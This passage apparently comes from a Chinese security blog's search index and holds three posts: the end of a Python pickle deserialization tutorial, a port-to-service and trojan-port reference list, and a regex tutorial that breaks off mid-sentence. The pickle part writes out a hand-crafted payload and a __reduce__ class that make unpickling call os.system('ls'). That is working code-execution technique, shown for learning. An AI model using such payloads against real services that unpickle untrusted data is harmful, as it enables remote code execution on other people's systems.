b']' # push empty listOBJ = b'o' # build &amp; push class instancePUT = b'p' # store stack top in memo; index is string argBINPUT = b'q' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b'r' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b's' # add key+value pair to dictTUPLE = b't' # build tuple from topmost stack itemsEMPTY_TUPLE = b')' # push empty tupleSETITEMS = b'u' # modify dict by adding topmost key+value pairsBINFLOAT = b'G' # push float; arg is 8-byte float encoding​TRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.pyFALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py 生成手写基本模式： 1234c&lt;module&gt;&lt;callable&gt;(&lt;args&gt;tR 例子： 1234cos # import ossystem # 添加 system() 到 stack(S'ls' # 把当前 stack 存到 metastack（保存os.system），清栈，压入 lstR. # t-弹出 stack 的内容，转换为 tuple，压入metastack，压入tuple，R-system(('ls',))，.-结束，返回栈顶元素（system('ls')） 用reduce生成123456import os, pickleclass Test(object): def __reduce__(self): return (os.system,('ls',))pickle.dumps(Test(),protocol=0)# b'cnt\\nsystem\\np0\\n(Vls\\np1\\ntp2\\nRp3\\n.' 缺点为只能执行单一函数，很难构造复杂操作。 利用AST自动化构造Github repo 可以做到： 变量赋值：存到memo，保存memo下标和变量名 函数调用 使用字面量 list 和 dict 成员修改 对象成员变量修改 支持的单行表达式： 变量赋值 - 左值可以是变量名、dict或list成员、对象成员；右值可以是基础类型的字面量、函数调用 函数调用 return - 可返回0或1个参数 参考：PPT，安全客，博客，先知社区","link":"/2020/03/10/pickle/"},{"title":"port-service","text":"端口与对应服务及常见漏洞 文件共享 端口 说明 漏洞 21，22，60 FTP、TFTP 文件传输 允许匿名的上传、下载、爆破、嗅探 2049 NFS 服务 配置不当 139 SAMBA 服务 爆破、未授权访问、远程代码执行 389 LDAP 目录访问协议 注入、允许匿名访问、弱口令 远程连接 端口 说明 漏洞 22 SSH 爆破、SSH隧道、内网代理转发、文件传输 23 Telnet 爆破、嗅探、弱口令 3389 RDP Shift 后门（Windows Server 2003 以下版本）、爆破 5900 VNC 爆破 5632 PcAnywhere 抓取密码、代码执行 TCP端口（静态端口）TCP 0= ReservedTCP 1=TCP Port Service MultiplexerTCP 2=DeathTCP 5=Remote Job Entry,yoyoTCP 7=EchoTCP 11=SkunTCP 12=BomberTCP 16=SkunTCP 17=SkunTCP 18=消息传输协议，skunTCP 19=SkunTCP 20=FTP Data,AmandaTCP 21=文件传输,Back Construction,Blade Runner,Doly Trojan,Fore,FTP trojan,Invisible FTP,Larva,WebEx,WinCrashTCP 22=远程登录协议TCP 23=远程登录（Telnet),Tiny Telnet Server (= TTS)TCP 25=电子邮件(SMTP),Ajan,Antigen,Email Password Sender,Happy99,Kuang2,ProMailtrojan,Shtrilitz,Stealth,Tapiras,Terminator,WinPC,WinSpy,Haebu CocedaTCP 27=AssasinTCP 28=AmandaTCP 29=MSG ICPTCP 30=Agent 40421TCP 31=Agent 31,Hackers Paradise,Masters Paradise,Agent 40421TCP 37=Time,ADM wormTCP 39=SubSARITCP 41=DeepThroat,ForeplayTCP 42=Host Name ServerTCP 43=WHOISTCP 44=ArcticTCP 48=DRATTCP 49=主机登录协议TCP 50=DRATTCP 51=IMP Logical Address Maintenance,Fuck Lamers BackdoorTCP 52=MuSka52,SkunTCP 53=DNS,Bonk (DOS Exploit)TCP 54=MuSka52TCP 58=DMSetupTCP 59=DMSetupTCP 63=whois++TCP 64=Communications IntegratorTCP 65=TACACS-Database ServiceTCP 66=Oracle SQL*NET,AL-BarekiTCP 67=Bootstrap Protocol ServerTCP 68=Bootstrap Protocol ClientTCP 69=TFTP,W32.Evala.Worm,BackGate Kit,Nimda,Pasana,Storm,Storm worm,Theef,Worm.Cycle.aTCP 70=Gopher服务，ADM wormTCP 79=用户查询（Finger),Firehotcker,ADM wormTCP 80=超文本服务器（Http),Executor,RingZeroTCP 81=Chubo,Worm.Bbeagle.qTCP 82=Netsky-ZTCP 88=Kerberos krb5服务TCP 99=Hidden PortTCP 102=消息传输代理TCP 108=SNA网关访问服务器TCP 109=Pop2TCP 110=电子邮件（Pop3),ProMailTCP 113=Kazimas,Auther IdnetTCP 115=简单文件传输协议TCP 118=SQL Services,Infector 1.4.2TCP 119=新闻组传输协议（Newsgroup(Nntp)),Happy 99TCP 121=JammerKiller,Bo jammerkillahTCP 123=网络时间协议(NTP),Net ControllerTCP 129=Password Generator ProtocolTCP 133=Infector 1.xTCP 135=微软DCE RPC end-point mapper服务TCP 137=微软Netbios Name服务（网上邻居传输文件使用）TCP 138=微软Netbios Name服务（网上邻居传输文件使用）TCP 139=微软Netbios Name服务（用于文件及打印机共享）TCP 142=NetTaxiTCP 143=Internet 邮件访问协议版本 4（IMAP4)TCP 146=FC Infector,InfectorTCP 150=NetBIOS Session ServiceTCP 156=SQL服务器TCP 161=SnmpTCP 162=Snmp-TrapTCP 170=A-TrojanTCP 177=X Display管理控制协议TCP 179=Border网关协议（BGP)TCP 190=网关访问控制协议（GACP)TCP 194=IrcTCP 197=目录定位服务（DLS)TCP 220=Internet 邮件访问协议版本 3（IMAP3)TCP 256=NirvanaTCP 315=The InvasorTCP 371=ClearCase版本管理软件TCP 389=Lightweight Directory Access Protocol (LDAP)TCP 396=Novell Netware over IPTCP 420=BreachTCP 421=TCP WrappersTCP 443=安全服务（HTTPS）TCP 444=Simple Network Paging Protocol(SNPP)TCP 445=Microsoft-DSTCP 455=Fatal ConnectionsTCP 456=Hackers paradise,FuseSparkTCP 458=苹果公司QuickTimeTCP 513=GrloginTCP 514=RPC BackdoorUDP 520=RipTCP 531=Rasmin,Net666TCP 544=kerberos kshellTCP 546=DHCP ClientTCP 547=DHCP ServerTCP 548=Macintosh文件服务TCP 555=Ini-Killer,Phase Zero,Stealth SpyTCP 569=MSNTCP 605=SecretServiceTCP 606=Noknok8TCP 660=DeepThroatTCP 661=Noknok8TCP 666=Attack FTP,Satanz Backdoor,Back Construction,Dark Connection Inside 1.2TCP 667=Noknok7.2TCP 668=Noknok6TCP 669=DP trojanTCP 692=GayOLTCP 707=Welchia,nachiTCP 777=AIM SpyTCP 808=RemoteControl,WinHoleTCP 815=Everyone DarlingTCP 901=Backdoor.DevilTCP 911=Dark ShadowTCP 990=ssl加密TCP 993=IMAPTCP 999=DeepThroatTCP 1000=Der SpaeherTCP 1001=Silencer,WebEx,Der SpaeherTCP 1003=BackDoorTCP 1010=DolyTCP 1011=DolyTCP 1012=DolyTCP 1015=DolyTCP 1016=DolyTCP 1020=VampireTCP 1023=Worm.Sasser.eTCP端口（动态端口）TCP 1024=NetSpy.698(YAI)TCP 1025=NetSpy.698,Unused Windows Services BlockTCP 1026=Unused Windows Services BlockTCP 1027=Unused Windows Services BlockTCP 1028=Unused Windows Services BlockTCP 1029=Unused Windows Services BlockTCP 1030=Unused Windows Services BlockTCP 1033=NetspyTCP 1035=MultidropperTCP 1042=BlaTCP 1045=RasminTCP 1047=GateCrasherTCP 1050=MiniCommandTCP 1059=nimregTCP 1069=Backdoor.TheefServer.202TCP 1070=Voice,Psyber Stream Server,Streaming Audio TrojanTCP 1080=Wingate,Worm.BugBear.B,Worm.Novarg.BTCP 1090=Xtreme,VDOLiveTCP 1092=LoveGateTCP 1095=RatTCP 1097=RatTCP 1098=RatTCP 1099=RatTCP 1110=nfsd-keepaliveTCP 1111=Backdoor.AIMVisionTCP 1155=Network File AccessTCP 1170=Psyber Stream Server,Streaming Audio trojan,VoiceTCP 1200=NoBackOTCP 1201=NoBackOTCP 1207=SoftwarTCP 1212=Nirvana,Visul KillerTCP 1234=UltorsTCP 1243=BackDoor-G,SubSeven,SubSeven ApocalypseTCP 1245=VooDoo DollTCP 1269=Mavericks MatrixTCP 1313=NirvanaTCP 1349=BioNetTCP 1433=Microsoft SQL服务TCP 1441=Remote StormTCP 1492=FTP99CMP(BackOriffice.FTP)TCP 1503=NetMeeting T.120TCP 1509=Psyber Streaming ServerTCP 1600=Shivka-BurkaTCP 1688=Key Management Service(密钥管理服务)TCP 1703=Exloiter 1.1TCP 1720=NetMeeting H.233 call SetupTCP 1723=VPN 网关（PPTP）TCP 1731=NetMeeting音频调用控制TCP 1807=SpySenderTCP 1966=Fake FTP 2000TCP 1976=Custom portTCP 1981=ShockraveTCP 1990=stun-p1 cisco STUN Priority 1 portTCP 1990=stun-p1 cisco STUN Priority 1 portTCP 1991=stun-p2 cisco STUN Priority 2 portTCP 1992=stun-p3 cisco STUN Priority 3 port,ipsendmsg IPsendmsgTCP 1993=snmp-tcp-port cisco SNMP TCP portTCP 1994=stun-port cisco serial tunnel portTCP 1995=perf-port cisco perf portTCP 1996=tr-rsrb-port cisco Remote SRB portTCP 1997=gdp-port cisco Gateway Discovery ProtocolTCP 1998=x25-svc-port cisco X.25 service (XOT)TCP 1999=BackDoor,TransScoutTCP 2000=Der Spaeher,INsane NetworkTCP 2002=W32. Beagle .AX @mmTCP 2001=Transmisson scoutTCP 2002=Transmisson scoutTCP 2003=Transmisson scoutTCP 2004=Transmisson scoutTCP 2005=TTransmisson scoutTCP 2011=cypressTCP 2015=raid-csTCP 2023=Ripper,Pass Ripper,Hack City Ripper ProTCP 2049=NFSTCP 2115=BugsTCP 2121=NirvanaTCP 2140=Deep Throat,The InvasorTCP 2155=NirvanaTCP 2208=RuXTCP 2255=Illusion MailerTCP 2283=HVL Rat5TCP 2300=PC ExplorerTCP 2311=Studio54TCP 2556=Worm.Bbeagle.qTCP 2565=StrikerTCP 2583=WinCrashTCP 2600=Digital RootBeerTCP 2716=Prayer TrojanTCP 2745=Worm.BBeagle.kTCP 2773=Backdoor,SubSevenTCP 2774=SubSeven2.1&amp;2.2TCP 2801=Phineas PhuckerTCP 2989=RatTCP 3024=WinCrash trojanTCP 3127=Worm.NovargTCP 3128=RingZero,Worm.Novarg.BTCP 3129=Masters ParadiseTCP 3150=Deep Throat,The InvasorTCP 3198=Worm.NovargTCP 3210=SchoolBusTCP 3332=Worm.Cycle.aTCP 3333=ProsiakTCP 3389=超级终端（远程桌面）TCP 3456=TerrorTCP 3459=Eclipse 2000TCP 3700=Portal of DoomTCP 3791=EclypseTCP 3801=EclypseTCP 3996=Portal of Doom,RemoteAnythingTCP 4000=腾讯QQ客户端TCP 4060=Portal of Doom,RemoteAnythingTCP 4092=WinCrashTCP 4242=VHMTCP 4267=SubSeven2.1&amp;2.2TCP 4321=BoBoTCP 4444=Prosiak,Swift remoteTCP 4500=W32.HLLW.TufasTCP 4567=File NailTCP 4590=ICQTrojanTCP 4899=Remote Administrator服务器TCP 4950=ICQTrojanTCP 5000=WindowsXP服务器，Blazer 5,Bubbel,Back Door Setup,Sockets de TroieTCP 5001=Back Door Setup,Sockets de TroieTCP 5002=cd00r,ShaftTCP 5011=One of the Last Trojans (OOTLT)TCP 5025=WM Remote KeyLoggerTCP 5031=Firehotcker,Metropolitan,NetMetroTCP 5032=MetropolitanTCP 5190=ICQ QueryTCP 5321=FirehotckerTCP 5333=Backage Trojan Box 3TCP 5343=WCratTCP 5400=Blade Runner,BackConstruction1.2TCP 5401=Blade Runner,Back ConstructionTCP 5402=Blade Runner,Back ConstructionTCP 5471=WinCrashTCP 5512=Illusion MailerTCP 5521=Illusion MailerTCP 5550=Xtcp,INsane NetworkTCP 5554=Worm.SasserTCP 5555=ServeMeTCP 5556=BO FacilTCP 5557=BO FacilTCP 5569=Robo-HackTCP 5598=BackDoor 2.03TCP 5631=PCAnyWhere dataTCP 5632=PCAnyWhereTCP 5637=PC CrasherTCP 5638=PC CrasherTCP 5698=BackDoorTCP 5714=Wincrash3TCP 5741=WinCrash3TCP 5742=WinCrashTCP 5760=Portmap Remote Root Linux ExploitTCP 5880=Y3K RATTCP 5881=Y3K RATTCP 5882=Y3K RATTCP 5888=Y3K RATTCP 5889=Y3K RATTCP 5900=WinVncTCP 6000=Backdoor.ABTCP 6006=Noknok8TCP 6129=Dameware Nt Utilities服务器TCP 6272=SecretServiceTCP 6267=广外女生TCP 6400=Backdoor.AB,The ThingTCP 6500=Devil 1.03TCP 6661=TemanTCP 6666=TCPshell.cTCP 6667=NT Remote Control,Wise 播放器接收端口TCP 6668=Wise Video广播端口TCP 6669=VampyreTCP 6670=DeepThroat,iPhoneTCP 6671=Deep Throat 3.0TCP 6711=SubSevenTCP 6712=SubSeven1.xTCP 6713=SubSevenTCP 6723=MstreamTCP 6767=NT Remote ControlTCP 6771=DeepThroatTCP 6776=BackDoor-G,SubSeven,2000 CracksTCP 6777=Worm.BBeagleTCP 6789=Doly TrojanTCP 6838=MstreamTCP 6883=DeltaSourceTCP 6912=Shit HeepTCP 6939=IndoctrinationTCP 6969=GateCrasher,Priority,IRC 3TCP 6970=RealAudio,GateCrasherTCP 7000=Remote Grab,NetMonitor,SubSeven1.xTCP 7001=Freak88TCP 7201=NetMonitorTCP 7215=BackDoor-G,SubSevenTCP 7001=Freak88,Freak2kTCP 7300=NetMonitorTCP 7301=NetMonitorTCP 7306=NetMonitor,NetSpy 1.0TCP 7307=NetMonitor,ProcSpyTCP 7308=NetMonitor,X SpyTCP 7323=Sygate服务器端TCP 7424=Host ControlTCP 7511=聪明基因TCP 7597=QazTCP 7609=Snid X2TCP 7626=冰河TCP 7777=The ThingTCP 7789=Back Door Setup,ICQKillerTCP 7983=MstreamTCP 8000=腾讯OICQ服务器端，XDMATCP 8010=Wingate,LogfileTCP 8011=WAY2.4TCP 8080=WWW 代理，Ring Zero,Chubo,Worm.Novarg.BTCP 8102=网络神偷TCP8181=W32.Erkez.D@mmTCP 8520=W32.Socay.WormTCP 8594=I-Worm/Bozori.aTCP 8787=BackOfrice 2000TCP 8888=WinvncTCP 8897=Hack Office,ArmageddonTCP 8989=ReconTCP 9000=NetministratorTCP 9325=MstreamTCP 9400=InCommand 1.0TCP 9401=InCommand 1.0TCP 9402=InCommand 1.0TCP 9872=Portal of DoomTCP 9873=Portal of DoomTCP 9874=Portal of DoomTCP 9875=Portal of DoomTCP 9876=Cyber AttackerTCP 9878=TransScoutTCP 9989=Ini-KillerTCP 9898=Worm.Win32.Dabber.aTCP 9999=Prayer TrojanTCP 10067=Portal of DoomTCP 10080=Worm.Novarg.BTCP 10084=SyphillisTCP 10085=SyphillisTCP 10086=SyphillisTCP 10101=BrainSpyTCP 10167=Portal Of DoomTCP 10168=Worm.Supnot.78858.c,Worm.LovGate.TTCP 10520=Acid ShiversTCP 10607=Coma trojanTCP 10666=AmbushTCP 11000=Senna SpyTCP 11050=Host ControlTCP 11051=Host ControlTCP 11223=Progenic,Hack ’99KeyLoggerTCP 11831=TROJ_LATINUS.SVRTCP 12076=Gjamer,MSH.104bTCP 12223=Hack’99 KeyLoggerTCP 12345=GabanBus,NetBus 1.6/1.7,Pie Bill Gates,X-billTCP 12346=GabanBus,NetBus 1.6/1.7,X-billTCP 12349=BioNetTCP 12361=Whack-a-moleTCP 12362=Whack-a-moleTCP 12363=Whack-a-moleTCP12378=W32/Gibe@MMTCP 12456=NetBusTCP 12623=DUN ControlTCP 12624=ButtmanTCP 12631=WhackJob,WhackJob.NB1.7TCP 12701=Eclipse2000TCP 12754=MstreamTCP 13000=Senna SpyTCP 13010=Hacker BrazilTCP 13013=PsychwardTCP 13223=Tribal Voice的聊天程序PowWowTCP 13700=Kuang2 The VirusTCP 14456=SoleroTCP 14500=PC InvaderTCP 14501=PC InvaderTCP 14502=PC InvaderTCP 14503=PC InvaderTCP 15000=NetDaemon 1.0TCP 15092=Host ControlTCP 15104=MstreamTCP 16484=MosuckerTCP 16660=Stacheldraht (DDoS)TCP 16772=ICQ RevengeTCP 16959=PriorityTCP 16969=PriorityTCP 17027=提供广告服务的Conducent”adbot”共享软件TCP 17166=MosaicTCP 17300=Kuang2 The VirusTCP 17490=CrazyNetTCP 17500=CrazyNetTCP 17569=Infector 1.4.x + 1.6.xTCP 17777=NephronTCP 18753=Shaft (DDoS)TCP 19191=蓝色火焰TCP 19864=ICQ RevengeTCP 20000=Millennium II (GrilFriend)TCP 20001=Millennium II (GrilFriend)TCP 20002=AcidkoRTCP 20034=NetBus 2 ProTCP 20168=LovgateTCP 20203=Logged,ChupacabraTCP 20331=BlaTCP 20432=Shaft (DDoS)TCP 20808=Worm.LovGate.v.QQTCP 213 35=Tribal Flood Network,TrinooTCP 21544=Schwindler 1.82,GirlFriendTCP 21554=Schwindler 1.82,GirlFriend,Exloiter 1.0.1.2TCP 22222=Prosiak,RuXUploader2.0TCP 22784=Backdoor.IntruzzoTCP 23432=Asylum 0.1.3TCP 23444=网络公牛TCP 23456=Evil FTP,Ugly FTP,WhackJobTCP 23476=Donald DickTCP 23477=Donald DickTCP 23777=INet SpyTCP 26274=DeltaTCP 26681=Spy VoiceTCP 27374=Sub Seven 2.0+,Backdoor.BasteTCP 27444=Tribal Flood Network,TrinooTCP 27665=Tribal Flood Network,TrinooTCP 29431=Hack AttackTCP 29432=Hack AttackTCP 29104=Host ControlTCP 29559=TROJ_LATINUS.SVRTCP 29891=The UnexplainedTCP 30001=Terr0r32TCP 30003=Death,Lamers DeathTCP 30029=AOL trojanTCP 30100=NetSphere 1.27a,NetSphere 1.31TCP 30101=NetSphere 1.31,NetSphere 1.27aTCP 30102=NetSphere 1.27a,NetSphere 1.31TCP 30103=NetSphere 1.31TCP 30303=Sockets de TroieTCP 30722=W32.Esbot.ATCP 30947=IntruseTCP 30999=Kuang2TCP 31336=Bo WhackTCP 31337=Baron Night,BO client,BO2,Bo Facil,BackFire,Back Orifice,DeepBO,Freak2k,NetSpyTCP 31338=NetSpy,Back Orifice,DeepBOTCP 31339=NetSpy DKTCP 31554=SchwindlerTCP 31666=BOWhackTCP 31778=Hack AttackTCP 31785=Hack AttackTCP 31787=Hack AttackTCP 31789=Hack AttackTCP 31791=Hack AttackTCP 31792=Hack AttackTCP 32100=PeanutBrittleTCP 32418=Acid BatteryTCP 33333=Prosiak,Blakharaz 1.0TCP 33577=Son Of PsychwardTCP 33777=Son Of PsychwardTCP 33911=Spirit 2001aTCP 34324=BigGluck,TN,Tiny Telnet ServerTCP 34555=Trin00 (Windows) (DDoS)TCP 35555=Trin00 (Windows) (DDoS)TCP 36794=Worm.Bugbear-ATCP 37651=YATTCP 40412=The SpyTCP 40421=Agent 40421,Masters Paradise.96TCP 40422=Masters ParadiseTCP 40423=Masters Paradise.97TCP 40425=Masters ParadiseTCP 40426=Masters Paradise 3.xTCP 41666=Remote BootTCP 43210=Schoolbus 1.6/2.0TCP 44444=Delta SourceTCP 44445=HappypigTCP 45576=未知代理TCP 47252=ProsiakTCP 47262=DeltaTCP 47878=BirdSpy2TCP 49301=Online KeyloggerTCP 50505=Sockets de TroieTCP 50766=Fore,SchwindlerTCP 51966=CafeIniTCP 53001=Remote Windows ShutdownTCP 53217=Acid Battery 2000TCP 54283=Back Door-G,Sub7TCP 54320=Back Orifice 2000,SheepTCP 54321=School Bus .69-1.11,Sheep,BO2KTCP 57341=NetRaiderTCP 58008=BackDoor.TronTCP 58009=BackDoor.TronTCP 58339=ButtFunnelTCP 59211=BackDoor.DuckToyTCP 60000=Deep ThroatTCP 60068=Xzip 6000068TCP 60411=ConnectionTCP 60606=TROJ_BCKDOR.G2.ATCP 61466=TelecommandoTCP 61603=Bunker-killTCP 63485=Bunker-killTCP 65000=Devil,DDoSTCP 65432=Th3tr41t0r,The TraitorTCP 65530=TROJ_WINMITE.10TCP 65535=RC,Adore Worm/LinuxUDP端口（静态端口）UDP 1=Sockets des TroieUDP 9=ChargenUDP 19=ChargenUDP 69=PasanaUDP 80=PenroxUDP 371=ClearCase版本管理软件UDP 445=公共Internet文件系统（CIFS)UDP 500=Internet密钥交换（IP安全性 ,IKE)UDP端口（动态端口）UDP 1025=Maverick’s Matrix 1.2 - 2.0UDP 1026=Remote Explorer 2000UDP 1027=UC聊天软件，Trojan.Huigezi.eUDP 1028=3721上网助手（用途不明，建议用户警惕！），KiLo,SubSARIUDP 1029=SubSARIUDP 1031=XotUDP 1032=Akosch4UDP 1104=RexxRaveUDP 1111=DaodanUDP 1116=LurkerUDP 1122=Last 2000,SingularityUDP 1183=Cyn,SweetHeartUDP 1200=NoBackOUDP 1201=NoBackOUDP 1342=BLA trojanUDP 1344=PtakksUDP 1349=BO dllUDP 1561=MuSka52UDP 1701=VPN网关（L2TP）UDP 1772=NetControleUDP 1978=SlapperUDP 1985=Black DiverUDP 2000=A-trojan,Fear,Force,GOTHIC Intruder,Last 2000,Real 2000UDP 2001=ScalperUDP 2002=SlapperUDP 2015=raid-csUDP 2018=rellpackUDP 2130=Mini BackLashUDP 2140=Deep Throat,Foreplay,The InvasorUDP 2222=SweetHeart,WayUDP 2339=Voice SpyUDP 2702=Black DiverUDP 2989=RATUDP 3150=Deep ThroatUDP 3215=XHXUDP 3333=DaodanUDP 3801=EclypseUDP 3996=Remote AnythingUDP 4128=RedShadUDP 4156=SlapperUDP 4500=sae-urn/ (IP安全性，IKE NAT遍历）UDP 5419=DarkSkyUDP 5503=Remote Shell TrojanUDP 5555=DaodanUDP 5882=Y3K RATUDP 5888=Y3K RATUDP 6112=Battle .net GameUDP 6666=KiLoUDP 6667=KiLoUDP 6766=KiLoUDP 6767=KiLo,UandMeUDP 6838=Mstream Agent-handlerUDP 7028=未知木马UDP 7424=Host ControlUDP 7788=SingularityUDP 7983=MStream handler-agentUDP 8012=PtakksUDP 8090=Aphex’s Remote Packet SnifferUDP 8127=9_119,ChonkerUDP 8488=KiLoUDP 8489=KiLoUDP 8787=BackOrifice 2000UDP 8879=BackOrifice 2000UDP 9325=MStream Agent-handlerUDP 10000=XHXUDP 10067=Portal of DoomUDP 10084=SyphillisUDP 10100=SlapperUDP 10167=Portal of DoomUDP 10498=MstreamUDP 10666=AmbushUDP 11225=CynUDP 12321=ProtossUDP 12345=BlueIce 2000UDP12378=W32/Gibe@MMUDP 12623=ButtMan,DUN ControlUDP 15210=UDP remote shell backdoor serverUDP 15486=KiLoUDP 16514=KiLoUDP 16515=KiLoUDP 18753=Shaft handler to AgentUDP 20433=ShaftUDP 21554=GirlFriendUDP 22784=Backdoor.IntruzzoUDP 23476=Donald DickUDP 25123=MOTDUDP 26274=Delta SourceUDP 26374=Sub-7 2.1UDP 26444=Trin00/TFN2KUDP 26573=Sub-7 2.1UDP 27184=Alvgus trojan 2000UDP 27444=TrinooUDP 29589=KiLoUDP 29891=The UnexplainedUDP 30103=NetSphereUDP 31320=Little WitchUDP 31335=Trin00 DoS AttackUDP 31337=Baron Night,BO client,BO2,Bo Facil,BackFire,Back Orifice,DeepBOUDP 31338=Back Orifice,NetSpy DK,DeepBOUDP 31339=Little WitchUDP 31340=Little WitchUDP 31416=LithiumUDP 31787=Hack aTackUDP 31789=Hack aTackUDP 31790=Hack aTackUDP 31791=Hack aTackUDP 33390=未知木马UDP 34555=TrinooUDP 35555=TrinooUDP 43720=KiLoUDP 44014=IaniUDP 44767=School BusUDP 46666=TaskmanUDP 47262=Delta SourceUDP 47785=KiLoUDP 49301=OnLine keyLoggerUDP 49683=FensterUDP 49698=KiLoUDP 52901=OmegaUDP 54320=Back OrificeUDP 54321=Back Orifice 2000UDP 54341=NetRaider TrojanUDP 61746=KiLOUDP 61747=KiLOUDP 61748=KiLOUDP 65432=The Traitor","link":"/2019/10/10/port-service/"},{"title":"正则表达式","text":"正则表达式（Regular Expression，缩写为 regex 或者 regexp）是一组特殊文本，可以用来从文本中找出满足你想要的格式的部分。From learn regex the easy way 12&quot;the&quot; =&gt; the fat cat sat on the mat.the 表示使用正则表达式 “the”（第一行） 可以匹配到字符串 “the fat cat sat on the mat” 中的 “the”（第二行） 基本匹配正则表达式其实就是执行搜素时的格式，大小写敏感。The表示一个规则，T紧接着h然后是e。 1&quot;The&quot; =&gt; The fat cat sat on the mat. 元字符概述正则表达式主要依赖于元字符，元字符不代表他们的字面意思，具有特殊含义： 元字符 描述 . 匹配任意单个字符，除了换行符 [] 匹配方括号内的任意字符 [^] 匹配方括号内容以外的任意字符 * 匹配任意个（包括0个）*之前的字符 + 匹配至少一个+前的字符 ? 匹配0个或者1个?之前的字符 {n,m} 匹配大于等于n，小于等于m个大括号前的字符 (xyz) 匹配与xyz完全相同的字符串 | 或运算符，匹配该符号前或者后的字符 \\ 转义字符，用于匹配一些保留字符 ^ 从前开始匹配 $ 从后开始匹配 点.12&quot;.ar&quot; =&gt; the car parked in the garagecar, par, gar 字符集字符集[]12&quot;[Tt]he&quot; =&gt; The car parked in the garage.The, the 另外，方括号内的.就表示它本身 12&quot;ar[.]&quot; =&gt; A garage is a good place to park a car.ar. 否定字符集[^]一般说来^表示一个字符串的开头，但放在方括号内的开头时，表示这个字符集时否定的 12&quot;[^c]ar&quot; =&gt; The car parked in the garage.par, gar 重复次数*号匹配在*之前的字符大于等于0次。表达式[a-z]*匹配所有以小写字母开头的字符串。 12&quot;[a-z]*&quot; =&gt; The car parked in the garage #21.he, car, parked, in, the, garage 使用.*可以匹配所有的字符串，\\s*cat\\s*匹配以任意个空格开头，任意个空格结尾的cat 12&quot;\\s*cat\\s*&quot; =&gt; The fat cat set on the concatenation.cat, cat +号匹配+号之前的字符出现至少一次 12&quot;c.+t&quot; =&gt; The fat cat sat on the mat.cat sat on the mat ?号匹配?号之前的字符出现0次或1次 12&quot;[T]?he&quot; =&gt; The car is parked in the garage.The, he {}控制一个或一组字符可出现的次数，{m,n}表示出现大于等于m小于等于n次。可以省略第二个参数，此时表示出现大于等于m次。{m}表示固定出现m次。 12345&quot;[0-9]{2,3}&quot; =&gt; The number was 9.9997 but we rounded it off to 10.0.999, 10&quot;[0-9]{3}&quot; =&gt; The number was 9.9997 but we rounded it off to 10.0.999 ()子模式括号内的内容表示一个子模式，其中可以使用|运算符 123&quot;(c|g|p)ar&quot; =&gt; The car is parked in the garage.car, par, gar |或运算符匹配之前或者之后的内容 12&quot;(T|t)he|car&quot; =&gt; The car is parked in the garage.The, car, the \\转码特殊字符反斜杠\\用于转码紧跟其后的字符，用于指定{}[]/\\+*.$^|?这些特殊字符。 12&quot;(f|c|m)at\\.?&quot; =&gt; The fat cat sat on the mat.fat, cat, mat. 锚点^号仅正则表达式在所匹配字符串的开头时才进行匹配。 12&quot;^(T|t)the&quot; =&gt; The car is parked in the garage.The $号同理于^，$仅正则表达式在所匹配字符串结尾时进行匹配。 12&quot;(at)\\.$&quot; =&gt; The fat cat. sat. on the mat.at. 简写字符集 简写 描述 . 除换行符外的所有字符 \\w 匹配所有字母数字下划线，等同于[a-zA-z0-9_] \\W 匹配所有非字母数字，等同于[^\\w] \\d 匹配数字,[0-9] \\D 匹配非数字 \\s 匹配所有空格字符，[\\t\\n\\f\\r\\p{Z}] \\S 匹配所有非空格字符 \\f 换页符 \\n 换行符 \\r 回车符 \\t 制表符 \\v 垂直制表符 \\p CR/LF，等同于\\r\\n，匹配DOS行终止符 零宽度断言（前后预查）– 未学习先行断言和后发断言都属于非捕获簇(不捕获文本 ，也不针对组合计进行计数). 先行断言用于判断所匹配的格式是否在另一个确定的格式之前, 匹配结果不包含该确定格式(仅作为约束). 例如, 我们想要获得所有跟在 $ 符号后的数字, 我们可以使用正后发断言 (?&lt;=\\$)[0-9\\.]*. 这个表达式匹配 $ 开头, 之后跟着 0,1,2,3,4,5,6,7,8,9,. 这些字符可以出现大于等于 0 次. 零宽度断言如下: 符号 描述 ?= 正先行断言-存在 ?! 负先行断言-排除 ?&lt;= 正后发断言-存在 ?&lt;! 负后发断言-排除 ?=... 正先行断言?=... 正先行断言, 表示第一部分表达式之后必须跟着 ?=...定义的表达式. 返回结果只包含满足匹配条件的第一部分表达式. 定义一个正先行断言要使用 (). 在括号内部使用一个问号和等号: (?=...). 正先行断言的内容写在括号中的等号后面. 例如, 表达式 (T|t)he(?=\\sfat) 匹配 The 和 the, 在括号中我们又定义了正先行断言 (?=\\sfat) ,即 The 和 the 后面紧跟着 (空格)fat. 1&quot;(T|t)he(?=\\sfat)&quot; =&gt; The fat cat sat on the mat. 在线练习 ?!... 负先行断言负先行断言 ?! 用于筛选所有匹配结果, 筛选条件为 其后不跟随着断言中定义的格式. 正先行断言 定义和 负先行断言 一样, 区别就是 = 替换成 ! 也就是 (?!...). 表达式 (T|t)he(?!\\sfat) 匹配 The 和 the, 且其后不跟着 (空格)fat. 1&quot;(T|t)he(?!\\sfat)&quot; =&gt; The fat cat sat on the mat. 在线练习 ?&lt;= ... 正后发断言正后发断言 记作(?&lt;=...) 用于筛选所有匹配结果, 筛选条件为 其前跟随着断言中定义的格式. 例如, 表达式 (?&lt;=(T|t)he\\s)(fat|mat) 匹配 fat 和 mat, 且其前跟着 The 或 the. 1&quot;(?&lt;=(T|t)he\\s)(fat|mat)&quot; =&gt; The fat cat sat on the mat. 在线练习 ?&lt;!... 负后发断言负后发断言 记作 (?&lt;!...) 用于筛选所有匹配结果, 筛选条件为 其前不跟随着断言中定义的格式. 例如, 表达式 (?&lt;!(T|t)he\\s)(cat) 匹配 cat, 且其前不跟着 The 或 the. 1&quot;(?&lt;!(T|t)he\\s)(cat)&quot; =&gt; The cat sat on cat. 在线练习 标志标志也叫模式修正符, 因为它可以用来修改表达式的搜索结果. 这些标志可以任意的组合使用, 它也是整个正则表达式的一部分. 标志 描述 i 忽略大小写. g 全局搜索. m 多行的: 锚点元字符 ^ $ 工作范围在每行的起始. 忽略大小写 (Case Insensitive)修饰语 i 用于忽略大小写. 例如, 表达式 /The/gi 表示在全局搜索 The, 在后面的 i 将其条件修改为忽略大小写, 则变成搜索 the 和 The, g 表示全局搜索. 1&quot;The&quot; =&gt; The fat cat sat on the mat. 在线练习 1&quot;/The/gi&quot; =&gt; The fat cat sat on the mat. 在线练习 全局搜索 (Global search)修饰符 g 